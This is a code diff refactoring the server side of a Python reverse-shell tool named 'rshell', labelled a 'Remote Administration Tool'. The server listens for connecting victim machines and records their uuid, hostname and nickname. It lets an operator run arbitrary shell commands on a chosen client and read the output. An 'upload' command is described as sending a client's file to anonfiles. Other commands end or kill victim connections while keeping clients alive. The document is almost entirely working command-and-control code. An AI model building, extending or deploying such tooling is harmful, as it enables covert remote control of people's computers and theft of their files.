@@ -2,13 +2,13 @@ import os
 import sys
 import time
 import socket
-import argparse
 import threading
 from colorama import Fore
 from difflib import get_close_matches
 
 import server.output as output
 import server.database as database
+
 ## Variables
 HOST_IP = '127.0.0.1'
 HOST_Port = 90
@@ -16,30 +16,9 @@ LOCAL_DATABASE = 'database.db'
 
 #main
 def main():
-    parser = argparse.ArgumentParser(
-        prog='rshell.py',
-        description="Remote Administration Tool"
-    )
-
-    parser.add_argument(
-        '--payload',
-        type=str,
-        default='none',
-        )
-
-    options = parser.parse_args()
-    modules = os.path.abspath('modules')
     db = database.data(LOCAL_DATABASE)
     s = server(HOST_IP,HOST_Port,db)
     s.start()
-##Clear console function
-def clear():
-    from os import system, name
-    if name == 'nt':
-        _ = system('cls')
-    else:
-        _ = system('clear')
-    output.banner()
 class server():
     def __init__(self,host,port,db):
         self.database = db
@@ -47,14 +26,12 @@ class server():
         self.port = port
         self.prompt = ''
         self.clients = []
-        self.uuids = []
-        self.hostlist = []
-        self.nicklist = []
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('0.0.0.0', self.port))
         self.quitting = False
         self.out = ''
+        self.cur = -1
         self.commands = {
             'help' : {
                 'method': self.help,
@@ -85,19 +62,19 @@ class server():
                 'usage': 'connect <client id>',
                 'description': 'reverse shell to client'},
             'upload' : {
-                'method': 'none',
+                'method': self.upload,
                 'usage': 'upload (filename)',
                 'description': 'uploads clients file to anonfiles'},
             'end' : {
-                'method': 'none',
+                'method': self.endconn,
                 'usage': 'end',
                 'description': 'ends current reverse shell'},
             'kill' : {
-                'method': 'none',
+                'method': self.kill,
                 'usage': 'kill',
                 'description': 'kills current reverse shell'},
             'exit' : {
-                'method': self.end,
+                'method': self.exit,
                 'usage': 'exit',
                 'description': 'quits rshell (keeps clients alive)'}
         }
@@ -117,92 +94,6 @@ class server():
                 output.echo(' command does not exist','WHITE')
         print('\n')
 
-    def connect(self,cli):
-        breakloop = False
-        c = int(cli)
-        #check if client exists
-        if c > len(self.clients)-1:
-                output.echo('\n[!]','RED')
-                output.echo(' invalid client\n\n','WHITE')
-                breakloop = True
-        else:
-            client = self.clients[c]
-        #check if its online before connecting
-        if not self.isOnline(client[0]):
-            output.echo('\n[!]','RED')
-            output.echo(' client not online\n\n','WHITE')
-            breakloop = True
-        while True:
-            if breakloop:
-                break
-            try:
-                self.prompt = Fore.MAGENTA + f'[client {c}]' + Fore.WHITE + 'rshell> '
-                cmd = input(self.prompt)
-                cmd_buffer = cmd
-                cmd, _, action = cmd_buffer.partition(' ')
-                if cmd == 'kill':
-                    killed = False
-                    while True:
-                        output.echo('\n[!]','RED')
-                        output.echo(' are you sure you want to kill connection [Y/N]: ','WHITE')
-                        inp = input()
-                        if inp.lower() == 'y':
-                            client[0].send(cmd.encode())
-                            killed = True
-                            break
-                        elif inp.lower() == 'n':
-                            output.echo('\n','WHITE')
-                            break
-                    if killed == True:
-                        self.database.remove(self.clients[c])
-                        self.clients.pop(c)
-                        self.uuids.pop(c)
-                        self.hostlist.pop(c)
-                        self.nicklist.pop(c)
-                        output.echo('\n[!]','RED')
-                        output.echo(' connection killed\n\n','WHITE')
-                        break
-                elif cmd == 'end':
-                    output.echo('\n[!]','RED')
-                    output.echo(' connection ended\n\n','WHITE')
-                    break
-                elif cmd == 'upload':
-                    cmd = cmd + ' ' + action
-                    client[0].send(cmd.encode())
-                    cmd_buffer = cmd
-                    cmd, _, action = cmd_buffer.partition(' ')
-                    print(client[0].recv(1024).decode())
-                #if try to connect while connected throw error message
-                elif cmd == 'connect':
-                    output.echo('\n[!]','RED')
-                    output.echo(' already established connection\n\n','WHITE')
-                #check for server commands first
-                elif cmd in self.commands:
-                        method = self.commands[cmd]['method']
-                        try:
-                            self.out = method(action) if len(action) else method()
-                        except Exception as e1:
-                            self.out = str(e1)
-                #send command to client
-                else:
-                    cmd = cmd + ' ' + action
-                    client[0].send(cmd.encode())
-                    cmd_buffer = cmd
-                    cmd, _, action = cmd_buffer.partition(' ')
-                    #dont do anything if cd will automatically update
-                    if(cmd == 'cd'):
-                        pass
-                    else:
-                        #receive input from client and print
-                        msg_size = int(client[0].recv(1024).decode())
-                        time.sleep(.001)
-                        print(client[0].recv(msg_size).decode())
-            except:
-                output.echo('\n[!]','RED')
-                output.echo(' connection ended\n','WHITE')
-                break
-        self.prompt = Fore.WHITE + 'rshell> '
-
     def listener(self):
         self.s.listen(100)
         while True:
@@ -221,25 +112,116 @@ class server():
                 if uuid == '':
                     pass
                 #determine if exists in list already if it does replace it if it doesnt create new and print message
-                elif uuid in self.uuids:
+                elif(pos := self.findcli('uuid',uuid)) != -1:
                     #set nickname since it exists and update database information with ip and computer name
                     newcli[2]['nickname'] = self.database.update(newcli)
-                    self.clients[self.uuids.index(uuid)] = newcli
+                    self.clients[pos] = newcli
                 else:
                     output.echo('\n\n[+]','GREEN')
                     output.echo(f' new client {newcli[1][0]}({hostname})\n','WHITE')
                     output.echo(f'\n{self.prompt}','WHITE')
                     #add new client to lists and import to database
                     self.clients.append(newcli)
-                    self.uuids.append(uuid)
-                    self.hostlist.append(hostname)
-                    self.nicklist.append(nickname)
                     self.database.new(newcli)
             except:
                 pass
 
-    def task(self,task):
-        pass
+    def connect(self,cli):
+        c = int(cli)
+        #check if already connected
+        if self.cur != -1:
+            output.echo('\n[!]','RED')
+            output.echo(' already established connection\n\n','WHITE')
+        #check if client exists
+        elif c > len(self.clients)-1:
+            output.echo('\n[!]','RED')
+            output.echo(' invalid client\n\n','WHITE')
+        #check if its online before connecting
+        elif not self.isOnline(self.clients[c][0]):
+            output.echo('\n[!]','RED')
+            output.echo(' client not online\n\n','WHITE')
+        else:
+            self.cur = c
+            self.prompt = Fore.MAGENTA + f'[client {c}]' + Fore.WHITE + 'rshell> '
+
+    def kill(self,cmd="kill"):
+        #check if not connected
+        if self.cur == -1:
+            output.echo('\n[!]','RED')
+            output.echo(' no connection established\n\n','WHITE')
+        else:
+            killed = False
+            while True:
+                output.echo('\n[!]','RED')
+                output.echo(' are you sure you want to kill connection [Y/N]: ','WHITE')
+                inp = input()
+                if inp.lower() == 'y':
+                    try:
+                        self.clients[self.cur][0].send(cmd.encode())
+                        killed = True
+                    except:
+                        self.endconn()
+                        output.echo('\n[!]','RED')
+                        output.echo(' connection ended\n','WHITE')
+                    break
+                elif inp.lower() == 'n':
+                    output.echo('\n','WHITE')
+                    break
+            if killed == True:
+                self.database.remove(self.clients[self.cur])
+                self.clients.pop(self.cur)
+                self.cur = -1
+                self.prompt = Fore.WHITE + 'rshell> '
+                output.echo('\n[!]','RED')
+                output.echo(' connection killed\n\n','WHITE')
+
+    def endconn(self,action=""):
+        #check if not connected
+        if self.cur == -1:
+            output.echo('\n[!]','RED')
+            output.echo(' no connection established\n\n','WHITE')
+        else:
+            self.cur = -1
+            self.prompt = Fore.WHITE + 'rshell> '
+            output.echo('\n[!]','RED')
+            output.echo(' connection ended\n\n','WHITE')
+
+    def upload(self,action=""):
+        #check if not connected
+        if self.cur == -1:
+            output.echo('\n[!]','RED')
+            output.echo(' no connection established\n\n','WHITE')
+        else:
+            try:
+                cmd = 'upload' + ' ' + action
+                self.clients[self.cur][0].send(cmd.encode())
+                print(self.clients[self.cur][0].recv(1024).decode())
+            except:
+                self.endconn()
+                output.echo('\n[!]','RED')
+                output.echo(' connection ended\n','WHITE')
+
+    def sendcommand(self,cmd):
+        #check if not connected
+        if self.cur == -1:
+            output.echo('\n[!]','RED')
+            output.echo(' no connection established\n\n','WHITE')
+        else:
+            try:
+                self.clients[self.cur][0].send(cmd.encode())
+                cmd_buffer = cmd
+                cmd, _, action = cmd_buffer.partition(' ')
+                #dont do anything if cd will automatically update
+                if(cmd == 'cd'):
+                    pass
+                else:
+                    #receive input from client and print
+                    msg_size = int(self.clients[self.cur][0].recv(1024).decode())
+                    time.sleep(.001)
+                    print(self.clients[self.cur][0].recv(msg_size).decode())
+            except:
+                self.endconn()
+
     def isOnline(self,client):
         #send connectionstatus twice to see if itll receive without error
         try:
@@ -252,10 +234,10 @@ class server():
 
     def search(self,action):
         results = []
-        for i in range(len(self.hostlist)):
-            if len(get_close_matches(action, [self.hostlist[i]])) > 0:
+        for i in range(len(self.clients)):
+            if len(get_close_matches(action, [self.clients[i][2]['hostname']])) > 0:
                 results.append(i)
-            elif len(get_close_matches(action, [self.nicklist[i]])) > 0:
+            elif len(get_close_matches(action, [self.clients[i][2]['nickname']])) > 0:
                 results.append(i)
         if len(results) == 0:
             output.echo('\n[!]','RED')
@@ -307,13 +289,10 @@ class server():
                 output.echo('Online','GREEN')
             else:
                 output.echo('Offline','RED')
-            hostname = client[2]['hostname']
-            nickname = client[2]['nickname']
-            uuid = client[2]['uuid']
             output.echo(f'\nip address:  {client[1][0]}','WHITE')
-            output.echo(f'\nhost name:  {hostname}','WHITE')
-            output.echo(f'\nnickname:  {nickname}','WHITE')
-            output.echo(f'\nuuid:  {uuid}\n\n','WHITE')
+            for key, value in client[2].items():
+                output.echo(f'\n{key}:  {value}','WHITE')
+            output.echo('\n\n','WHITE')
 
     def listclients(self,type='none'):
         count = 0
@@ -334,13 +313,17 @@ class server():
                 count += 1
         print('\n')
 
+    def findcli(self,key,val):
+        count = 0
+        for i in self.clients:
+            if i[2][key] == val:
+                return count
+            count += 1
+        return -1
+
     def start(self):
-        #populate lists from the database
-        poplist = self.database.populate()
-        self.clients = poplist[0]
-        self.uuids = poplist[1]
-        self.hostlist = poplist[2]
-        self.nicklist = poplist[3]
+        #populate clients from the database
+        self.clients = self.database.populate()
         #start listening thread to listen for clients in background
         self.listenThread = threading.Thread(target=self.listener)
         self.listenThread.daemon = True
@@ -358,20 +341,30 @@ class server():
                         self.out = method(action) if len(action) else method()
                     except Exception as e1:
                         self.out = str(e1)
+                elif self.cur != -1:
+                    self.sendcommand(cmd + ' ' + action)
                 elif (self.out == ''):
                     output.echo('\n[!]','RED')
                     output.echo(' command does not exist\n\n','WHITE')
                 self.out = ''
             except KeyboardInterrupt:
                     self.quitting = True
-                    self.end()
-
+                    self.exit()
     ##Exit Handler
-    def end(self):
+    def exit(self):
         self.s.close()
         output.echo('\n[X]','RED')
         output.echo(' quiting rshell\n\n', 'WHITE')
         sys.exit()
+
+##Clear console function
+def clear():
+    from os import system, name
+    if name == 'nt':
+        _ = system('cls')
+    else:
+        _ = system('clear')
+    output.banner()
 
 if __name__ == "__main__":
     clear()
